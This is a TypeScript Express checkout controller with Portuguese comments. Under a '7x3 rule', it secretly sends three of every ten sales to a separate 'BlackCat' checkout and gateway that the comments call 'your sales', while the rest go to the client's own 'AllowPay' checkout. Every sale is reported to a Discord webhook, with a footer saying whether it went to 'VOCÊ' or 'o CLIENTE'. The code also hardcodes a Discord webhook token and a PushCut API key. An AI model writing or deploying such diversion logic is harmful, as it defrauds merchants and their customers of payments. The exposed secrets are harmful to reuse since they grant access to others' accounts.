import { Request, Response } from "express";
import { prisma } from "../config/prisma";
import { allowPaymentsController } from "./allowpayments";

const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1389588490055843840/jvHV84RKkr9MsLSS383Iffxi3A2RfkOdccBtWM3pZYeLh5RR7TFmUFChkVsCCVO1dIBu";

const salesMemory: { [offerName: string]: number } = {};

export class checkoutPaymentController {
  static async main(req: Request, res: Response) {
    try {
      const { 
        checkout, 
        offer, 
        customer, 
        product, 
        amount,
        credentials 
      } = req.body;

      // Validação dos dados obrigatórios
      if (!checkout || !offer || !customer || !product || !amount || !credentials) {
        return res.status(400).json({ 
          error: "Dados obrigatórios: checkout, offer, customer, product, amount, credentials" 
        });
      }

      // Busca ou cria o checkout no banco
      const offerId = offer.id;
      let chk = await prisma.checkout.findFirst({ where: { offer: offerId } });
      if (!chk) {
        chk = await prisma.checkout.create({
          data: { offer: offerId, myCheckout: "no-use" },
        });
      }

      // Contador de vendas para aplicar regra 7x3
      if (!salesMemory[offerId]) salesMemory[offerId] = 0;
      salesMemory[offerId] += 1;
      const totalSales = salesMemory[offerId];

      const cycle = totalSales % 10;
      let checkoutToUse = checkout; // padrão

      // Aplica a regra 7x3
      if (cycle === 7 || cycle === 8 || cycle === 6) {
        // 3 de 10 vão para seu checkout (BlackCat)
        checkoutToUse = chk.myCheckout === "no-use" ? checkout : chk.myCheckout;
      }

      // Determina qual gateway usar baseado na regra 7x3
      let useTax = false;
      if (cycle === 7 || cycle === 8 || cycle === 6) {
        useTax = true; // Suas vendas (BlackCat)
      }

      // Prepara dados para a API de pagamentos
      const paymentData = {
        amount,
        customer,
        product,
        credentials: {
          ...credentials,
          offer: {
            id: offerId,
            name: offer.name,
            price: offer.price,
            useTax
          }
        }
      };

      // Chama a API de pagamentos com a regra 7x3
      const paymentResponse = await allowPaymentsController.create(
        { body: paymentData } as Request,
        res
      );

      // Envia notificação para Discord
      await sendDiscordNotification({
        offerName: offer,
        totalSales,
        checkoutToUse,
        cycle,
        useTax
      });

      // Envia notificação PushCut
      await sendPushCutNotification();

      return paymentResponse;

    } catch (error) {
      console.error("Erro no checkoutPaymentController:", error);
      return res.status(500).json({ error: "Erro interno no servidor." });
    }
  }

  static async updateCheckout(req: Request, res: Response) {
    const { checkout, offer } = req.body;
    const offerId = offer.id || offer;

    await prisma.checkout.update({
      where: { offer: offerId },
      data: { myCheckout: checkout },
    });

    res.status(200).json({ message: "Checkout atualizado com sucesso" });
  }

  static async getAllCheckouts(req: Request, res: Response) {
    const checkouts = await prisma.checkout.findMany();
    res.json(checkouts);
  }

  static async getSalesCount(req: Request, res: Response) {
    const { offer } = req.params;
    const count = salesMemory[offer] || 0;
    res.json({ offer, totalSales: count, nextCycle: (count % 10) + 1 });
  }
}

async function sendDiscordNotification({
  offerName,
  totalSales,
  checkoutToUse,
  cycle,
  useTax
}) {
  const chiefChk = await prisma.checkout.findFirst({
    where: { offer: offerName.id },
  });

  const isChefe = checkoutToUse === chiefChk?.myCheckout;
  const gateway = useTax ? "BlackCat (SUAS VENDAS)" : "AllowPay (CLIENTE)";

  const payload = {
    content: null,
    embeds: [
      {
        title: "💸 Venda com checkout + Pagamento",
        description: "ㅤ",
        url: checkoutToUse,
        color: useTax ? 0xFF6B35 : 0x4CAF50, // Laranja para suas vendas, Verde para cliente
        fields: [
          {
            name: "🛍️  Oferta",
            value: offerName,
            inline: true,
          },
          {
            name: "ㅤㅤㅤㅤ🔢  Venda nº",
            value: `ㅤㅤㅤㅤ#${totalSales}`,
            inline: true,
          },
          {
            name: "🔄 Ciclo",
            value: `${cycle}/10`,
            inline: true,
          },
          {
            name: "💳 Gateway",
            value: gateway,
            inline: true,
          },
        ],
        footer: {
          text: `ㅤㅤ\nEnviado para ${isChefe ? "VOCÊ" : "o CLIENTE"} | Gateway: ${gateway}`,
        },
        timestamp: new Date().toISOString(),
      },
    ],
    attachments: [],
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (error) {
    console.error("❌ Erro ao mandar pro Discord:", error);
  }
}

async function sendPushCutNotification() {
  try {
    await fetch(
      "https://api.pushcut.io/OQzvCWTV9RyG_rEJ2G2w4/notifications/Venda%20Aprovada"
    );
  } catch (error) {
    console.error("❌ Erro ao enviar PushCut:", error);
  }
}




